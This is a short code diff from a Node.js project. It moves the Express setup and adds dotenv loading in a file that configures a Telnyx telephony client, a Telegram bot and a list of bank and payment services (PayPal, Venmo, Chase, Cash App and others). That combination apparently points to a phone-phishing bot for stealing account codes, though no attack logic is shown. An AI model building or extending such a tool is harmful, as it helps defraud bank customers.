@@ -1,3 +1,7 @@
+const express = require('express');
+const app = express();
+require('dotenv').config()
+
 // TELNYX STUFF 
 const API_KEY = process.env.MY_API_KEY
 const API2 = process.env.API2
@@ -12,8 +16,7 @@ const telnyx = require('telnyx')(API2);
 const { Telegraf } = require('telegraf'); // importing telegraf.js
 var bot = new Telegraf(bot_token)
 
-const express = require('express');
-const app = express();
+
 const port = process.env.PORT || 3000;
 const serviceList = [ 'paypal', 'venmo', 'boa', 'chase', 'bank', 'cashapp' ]
 
